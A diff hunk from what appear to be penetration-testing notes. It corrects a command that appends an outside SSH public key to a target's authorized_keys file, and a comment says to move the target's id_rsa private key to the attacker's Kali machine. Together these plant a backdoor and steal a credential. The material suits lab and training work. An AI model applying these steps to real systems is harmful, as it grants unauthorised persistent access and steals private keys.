@@ -28,7 +28,7 @@ ssh-keygen
 cp ~/.ssh/id_rsa.pub ~/.ssh/authorized_keys
 echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKrUuxHUQfisszFPV0fByg09czHmKW/z9JmTX4ecVROw mobin@solcoteh' >> ~/.ssh/authorized_keys
 --------------------OR------------------------------
-ssh-rsa echo 'AAAAB3NzaC1yc2EAAAADAQABAAABgQDBYdgoZ9e0IqbhjeytxP7E2KOH+8zGPyLMG1wNTgYKMkOYrDPspQ0DInXlAO7PkSBVfSUWAfZjEa64Do98CslzKNjwTXNLmux6rA1bZCE+hUCAgjkWoSMBP8BZQK4aLaPIEBwwpuAeisVR56irOGyEsrUaVD9ULl8tlEUCw3Himqc8cE8osa3rg2n/Ei8hcaF0P4yAarhE1GxjGMLcgjjE9H2jd5I9jGyPBemGEC+PS3vL8I96Feu1GkC7o6jjcnWwVhOdCI/d9OmOWql6a1iUienvK2tSAzXbVO+BDZqB8tRoBxczSTkPIFH1eydudiHZZKBmTkzlmpdLxMT0cViuMzj1oF/UVuICBrZPm3+wNbc1P0ZCZYACIZh9MfFOp5aOMiv+iOm0wcghb4h50hwApxbm/5YyLoc8v5E4uEqRXc/tLJbJaWvbLcaPlpXlUnF1Af4WN7YRbblgTagGto8h0atKE1SRKSvtlVk5PKIDc0JCO+neYb8shJn/F250J8U= mobin@solcoteh' >> ~/.ssh/authorized_keys
+ echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDBYdgoZ9e0IqbhjeytxP7E2KOH+8zGPyLMG1wNTgYKMkOYrDPspQ0DInXlAO7PkSBVfSUWAfZjEa64Do98CslzKNjwTXNLmux6rA1bZCE+hUCAgjkWoSMBP8BZQK4aLaPIEBwwpuAeisVR56irOGyEsrUaVD9ULl8tlEUCw3Himqc8cE8osa3rg2n/Ei8hcaF0P4yAarhE1GxjGMLcgjjE9H2jd5I9jGyPBemGEC+PS3vL8I96Feu1GkC7o6jjcnWwVhOdCI/d9OmOWql6a1iUienvK2tSAzXbVO+BDZqB8tRoBxczSTkPIFH1eydudiHZZKBmTkzlmpdLxMT0cViuMzj1oF/UVuICBrZPm3+wNbc1P0ZCZYACIZh9MfFOp5aOMiv+iOm0wcghb4h50hwApxbm/5YyLoc8v5E4uEqRXc/tLJbJaWvbLcaPlpXlUnF1Af4WN7YRbblgTagGto8h0atKE1SRKSvtlVk5PKIDc0JCO+neYb8shJn/F250J8U= mobin@solcoteh' >> ~/.ssh/authorized_keys
 # transfer id_rsa target file to our kali 
 # in our kali 
 chmod 600 id_rsa 
